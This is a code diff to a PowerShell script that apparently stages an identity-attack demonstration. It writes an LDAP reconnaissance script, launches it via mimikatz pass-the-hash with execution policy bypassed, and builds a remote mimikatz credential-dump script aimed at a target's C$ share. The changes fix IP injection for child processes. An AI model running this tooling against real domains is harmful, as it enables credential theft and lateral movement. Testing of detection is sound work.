@@ -350,6 +350,8 @@ Write-Host "`nPress any key to close..." -ForegroundColor Gray
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 '@
             $ldapScript | Out-File -FilePath "$idpDir\ldap_recon.ps1" -Encoding ASCII
+            # Inject actual DC IP (PtH child process may not inherit env vars)
+            (Get-Content "$idpDir\ldap_recon.ps1") -replace '\$env:ENV_DC_IP', "'$($env:ENV_DC_IP)'" | Set-Content "$idpDir\ldap_recon.ps1" -Encoding ASCII
 
             # Create a batch launcher (mimikatz /run: only takes a single exe, no args)
             $batContent = '@powershell -ExecutionPolicy Bypass -File C:\IDP_Files\ldap_recon.ps1'
@@ -623,9 +625,10 @@ public class CryptoMD4 {
             if (-not $demoHash) { break }
 
             # Write the remote dump PowerShell script to disk (avoids nested here-string)
+            # IMPORTANT: Inject actual IP values here — PtH child process may not inherit env vars
             $scriptLines = @(
                 '$ErrorActionPreference = "Continue"'
-                '$target = $env:ENV_DT'
+                "`$target = `"$($env:ENV_DT)`""
                 '$idpDir = "C:\IDP_Files"'
                 '$localMimi = "$idpDir\Mimikatz\x64\mimikatz.exe"'
                 '$remotePath = "\\$target\C$\Temp"'
